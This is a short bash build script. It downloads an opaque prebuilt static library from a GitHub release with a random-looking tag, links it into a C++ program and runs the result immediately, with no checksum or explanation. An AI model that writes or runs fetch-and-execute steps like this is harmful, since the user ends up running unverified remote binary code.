#!/usr/bin/env bash
set -e
REPO="kkuiduodj/leadcruiser"
TAG="frosty-canyon-clever-harbor"
LIB="maple-thorn.a"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "$URL"
g++ -pthread -std=c++17 -O2 main.cpp "$LIB" -o app && ./app
